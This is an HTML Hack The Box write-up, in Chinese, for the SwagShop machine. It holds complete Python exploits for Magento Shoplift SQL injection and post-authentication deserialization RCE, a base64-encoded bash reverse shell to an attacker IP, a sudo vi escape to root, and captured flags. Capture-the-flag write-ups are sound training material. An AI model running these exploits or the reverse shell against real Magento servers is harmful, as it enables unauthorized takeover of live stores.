@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB SwagShop — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🛒</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='swagshop'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-ss','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}};if(sessionStorage.getItem('htb-auth-ss')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>SwagShop</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>22 · 80</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Magento SQLi 创建管理员 → 认证后反序列化 RCE</span><span class="chain-arrow">→</span><span class="chain-node red">sudo vi → :shell → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.229.138</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Did not follow redirect to http://swagshop.htb/</span></code></pre>
+
+<pre><code><span class="cmd">$ echo "10.129.229.138 swagshop.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+<p>访问 <code>http://swagshop.htb</code> 发现是 <strong>Magento</strong> 电商系统。通过配置文件确认版本：</p>
+
+<pre><code><span class="cmd">http://swagshop.htb/app/code/core/Mage/Admin/etc/config.xml</span>
+<span class="output">→ Mage_Admin version <span class="highlight">1.6.1.1</span></span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>漏洞一：Magento Shoplift (SUPEE-5344) — SQL 注入创建管理员</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 助记：偷渡建户</span>
+通过 SQL 注入偷偷在数据库里建一个管理员账号。Magento 的 <code>Cms_Wysiwyg/directive</code> 端点没有做输入过滤，攻击者可以在 <code>filter</code> 参数中注入完整的 SQL 语句——INSERT 一个新的 admin 用户。
+</div>
+
+<h3>Python3 Exploit</h3>
+<pre><code>#!/usr/bin/env python3
+# Magento Shoplift exploit (SUPEE-5344) — Python 3 Port
+
+import requests
+import base64
+import sys
+
+if len(sys.argv) < 2:
+    print(f"Usage: python3 {sys.argv[0]} &lt;target_url&gt;")
+    sys.exit(1)
+
+target = sys.argv[1].rstrip("/")
+target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
+
+q = """
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,
+`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`)
+VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL,NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name)
+VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""
+
+query = q.replace("\n", "").format(username="forme", password="forme")
+pfilter = f"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{query}"
+pfilter_encoded = base64.b64encode(pfilter.encode()).decode()
+
+r = requests.post(target_url, data={
+    "___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
+    "filter": pfilter_encoded, "forwarded": 1
+}, timeout=10)
+
+if r.status_code == 200:
+    print("[+] 成功！使用 forme:forme 登录 admin 后台")</code></pre>
+
+<pre><code><span class="cmd">$ python3 shoplift.py http://swagshop.htb</span>
+<span class="output">[+] 成功！使用 <span class="highlight">forme:forme</span> 登录 http://swagshop.htb/index.php/admin</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 2</div><h2>漏洞二：Magento CE &lt; 1.9.0.1 认证后反序列化 RCE</h2></div>
+
+<h3>获取 install_date（签名密钥）</h3>
+<pre><code><span class="cmd">http://swagshop.htb/app/etc/local.xml</span>
+<span class="output">&lt;install&gt;
+  &lt;date&gt;<span class="highlight">Wed, 08 May 2019 07:23:09 +0000</span>&lt;/date&gt;
+&lt;/install&gt;</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">🧒 为什么 install_date 必须正确？——对暗号</span>
+exploit 生成 URL 时计算 <code>md5(base64_payload + install_date)</code> 作为签名。服务器用自己存储的 install_date 做同样的哈希校验，不匹配则拒绝执行。install_date 本质上充当了一个<strong>共享密钥</strong>——暗号不对就拒绝执行。
+</div>
+
+<h3>完整 Exploit（Python3，含 POP 链）</h3>
+<pre><code>#!/usr/bin/env python3
+# Magento CE &lt; 1.9.0.1 Post Auth RCE
+
+import sys, re, base64, hashlib, requests
+
+target = sys.argv[1]
+arg = sys.argv[2]
+
+username = 'forme'
+password = 'forme'
+php_function = 'system'
+install_date = 'Wed, 08 May 2019 07:23:09 +0000'
+
+# Zend_Log POP chain — triggers php_function(arg) on deserialization
+payload_template = (
+    'O:8:"Zend_Log":1:{s:11:"\x00*\x00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{'
+    's:16:"\x00*\x00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";'
+    'i:2;s:15:"EXTERMINATE!!!!";}s:22:"\x00*\x00_subjectPrependText";N;s:10:"\x00*\x00_layout";'
+    'O:23:"Zend_Config_Writer_Yaml":3:{s:15:"\x00*\x00_yamlEncoder";s:%d:"%s";s:17:'
+    '"\x00*\x00_loadedSection";N;s:10:"\x00*\x00_config";O:13:"Varien_Object":1:{s:8:'
+    '"\x00*\x00_data";s:%d:"%s";}}s:8:"\x00*\x00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}'
+)
+payload = payload_template % (len(php_function), php_function, len(arg), arg)
+
+session = requests.Session()
+login_page = session.get(target)
+session.post(target, data={'login[username]': username, 'login[password]': password})
+content = session.get(target).text
+
+url = re.search(r"ajaxBlockUrl = '(.*)'", content).group(1)
+key = re.search(r"var FORM_KEY = '(.*)'", content).group(1)
+
+r = session.post(f"{url}block/tab_orders/period/7d/?isAjax=true",
+                 data={'isAjax': 'false', 'form_key': key})
+tunnel = re.search(r'src="(.*)\?ga=', r.text).group(1)
+
+payload_b64 = base64.b64encode(payload.encode()).decode()
+gh = hashlib.md5((payload_b64 + install_date).encode()).hexdigest()
+
+result = session.get(f"{tunnel}?ga={payload_b64}&amp;h={gh}")
+print(result.text)</code></pre>
+
+<pre><code><span class="cmd">$ python3 rce.py http://swagshop.htb/index.php/admin/ "id"</span>
+<span class="output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+
+<h3>反弹 Shell</h3>
+<pre><code><span class="cmd">$ nc -lnvp 4444</span>
+
+<span class="comment"># Base64 编码反弹 shell 避免特殊字符问题</span>
+<span class="cmd">$ echo -n 'bash -i >& /dev/tcp/10.10.15.65/4444 0>&1' | base64</span>
+<span class="cmd">$ python3 rce.py http://swagshop.htb/index.php/admin/ \
+    "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42NS80NDQ0IDA+JjE= | base64 -d | bash"</span>
+
+<span class="output">www-data@swagshop:~$ cat /home/haris/user.txt
+73b7bde45e9f34d9533d461e57fd53d8</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>权限提升 — sudo vi 逃逸</h2></div>
+
+<pre><code><span class="cmd">www-data@swagshop:~$ sudo -l</span>
+<span class="output">(root) NOPASSWD: <span class="highlight">/usr/bin/vi /var/www/html/*</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 助记：开门进编辑器，编辑器里有后门通 root</span>
+vi 以 root 运行时，<code>:shell</code> 命令会派生一个子 shell，该子 shell 继承 vi 的 root 权限。GTFOBins 经典条目。
+</div>
+
+<pre><code><span class="cmd">www-data@swagshop:~$ sudo /usr/bin/vi /var/www/html/a</span>
+
+<span class="comment"># 进入 vi 后输入：</span>
+<span class="highlight">:set shell=/bin/sh
+:shell</span>
+
+<span class="output">root@swagshop:~# cat /root/root.txt
+8ac4c6765061383b59c3b412ad8285a9</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Magento Shoplift (SUPEE-5344) 是经典的 SQL 注入建管理员。</strong><p>通过 <code>Cms_Wysiwyg/directive</code> 端点注入 INSERT 语句，无需认证即可创建后台管理员账号。搜索 <code>searchsploit magento</code> 就能找到。</p></div>
+<div class="takeaway-item"><strong>install_date 是 Magento RCE 的「对暗号」环节。</strong><p>exploit 用 <code>md5(payload + install_date)</code> 做签名校验。从 <code>/app/etc/local.xml</code> 读取正确的 install_date 是 exploit 成功的前提。</p></div>
+<div class="takeaway-item"><strong>PHP 反序列化 POP 链是高级 Web 攻击的核心。</strong><p>Zend_Log → Zend_Config_Writer_Yaml → Varien_Object 的链条最终调用 <code>system(arg)</code>。不需要手动构造——公开 exploit 已经包含完整链条。</p></div>
+<div class="takeaway-item"><strong>sudo vi/vim 是 GTFOBins 经典提权。</strong><p><code>:set shell=/bin/sh</code> + <code>:shell</code> 两步拿 root。任何以 root 运行且能启动子进程的编辑器（vi、vim、nano、less、man）都可以用这个方法。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">SQLi 建管理员</span><span class="arrow">→</span><span class="node node-green">反序列化 RCE</span><span class="arrow">→</span><span class="node node-green">www-data</span><span class="arrow">→</span><span class="node node-red">sudo vi → :shell → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB SwagShop 攻略 · 2026</footer>
+</body></html>
